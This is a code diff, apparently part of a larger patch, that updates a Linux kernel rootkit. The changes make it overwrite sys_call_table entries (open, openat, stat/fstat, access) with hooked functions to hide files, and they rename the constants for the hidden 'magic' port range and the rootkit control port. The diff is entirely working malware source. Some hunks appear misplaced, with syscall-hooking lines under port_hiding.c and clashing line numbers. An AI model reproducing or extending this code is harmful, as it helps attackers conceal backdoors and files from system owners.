@@ -118,3 +118,85 @@
 +        "Not Supported"
 +#endif
      );
+
+--- a/file_hiding.c
++++ b/file_hiding.c
+@@ -442,5 +442,12 @@
+    original_open = (void *)sys_call_table[__NR_open];
+    original_openat = (void *)sys_call_table[__NR_openat];
++#ifdef __NR_newfstat
+    original_stat = (void *)sys_call_table[__NR_newfstat];
++#elif defined(__NR_fstat)
++    original_stat = (void *)sys_call_table[__NR_fstat];
++#else
++    original_stat = NULL;
++    printk(KERN_WARNING "[rootkit] stat syscall not available\n");
++#endif
+    original_access = (void *)sys_call_table[__NR_access];
+
+--- a/port_hiding.c
++++ b/port_hiding.c
+@@ -79,9 +79,5 @@
+ static int is_magic_port(__be16 port);
+ 
+-// 检查是否为魔术端口
+-static int is_magic_port(__be16 port) {
+-    __be16 host_port = ntohs(port);
+-    return (host_port >= MAGIC_PORT_RANGE_START && host_port <= MAGIC_PORT_RANGE_END);
+-}
++// 注意：is_magic_port函数已在rootkit.h中定义，这里不需要重复定义
+ 
+ // 检查端口是否应该被隐藏
+@@ -84,1 +84,1 @@
+ static int should_hide_port(__be16 port) {
+-    return is_magic_port(port) || ntohs(port) == ROOTKIT_PORT;
++    return is_magic_port(ntohs(port)) || ntohs(port) == CONTROL_PORT;
+ }
+@@ -448,4 +448,4 @@
+     offset += snprintf(buffer + offset, size - offset,
+                       "\nMagic Port Range: %d-%d\n",
+-                      MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
++                      MAGIC_PORT_START, MAGIC_PORT_END);
+     offset += snprintf(buffer + offset, size - offset,
+-                      "Rootkit Control Port: %d\n", ROOTKIT_PORT);
++                      "Rootkit Control Port: %d\n", CONTROL_PORT);
+@@ -495,7 +495,7 @@
+     // 自动隐藏魔术端口范围
+-    hide_port_range(htons(MAGIC_PORT_RANGE_START), htons(MAGIC_PORT_RANGE_END), 0);
++    hide_port_range(htons(MAGIC_PORT_START), htons(MAGIC_PORT_END), 0);
+     
+     // 隐藏rootkit控制端口
+-    hide_port(htons(ROOTKIT_PORT), 0);
++    hide_port(htons(CONTROL_PORT), 0);
+     
+     printk(KERN_INFO "[rootkit] Port hiding subsystem initialized\n");
+     printk(KERN_INFO "[rootkit] Magic port range: %d-%d\n", 
+-           MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
+-    printk(KERN_INFO "[rootkit] Rootkit control port: %d\n", ROOTKIT_PORT);
++           MAGIC_PORT_START, MAGIC_PORT_END);
++    printk(KERN_INFO "[rootkit] Rootkit control port: %d\n", CONTROL_PORT);
+ 
+@@ -458,5 +465,9 @@
+     sys_call_table[__NR_open] = (unsigned long)hooked_open;
+     sys_call_table[__NR_openat] = (unsigned long)hooked_openat;
++#ifdef __NR_newfstat
+     sys_call_table[__NR_newfstat] = (unsigned long)hooked_stat;
++#elif defined(__NR_fstat)
++    sys_call_table[__NR_fstat] = (unsigned long)hooked_stat;
++#endif
+     sys_call_table[__NR_access] = (unsigned long)hooked_access;
+     enable_write_protection();
+ 
+@@ -485,6 +496,11 @@
+         if (original_openat)
+             sys_call_table[__NR_openat] = (unsigned long)original_openat;
+-        if (original_stat)
++        if (original_stat) {
++#ifdef __NR_newfstat
+             sys_call_table[__NR_newfstat] = (unsigned long)original_stat;
++#elif defined(__NR_fstat)
++            sys_call_table[__NR_fstat] = (unsigned long)original_stat;
++#endif
++        }
+         if (original_access)
+             sys_call_table[__NR_access] = (unsigned long)original_access;
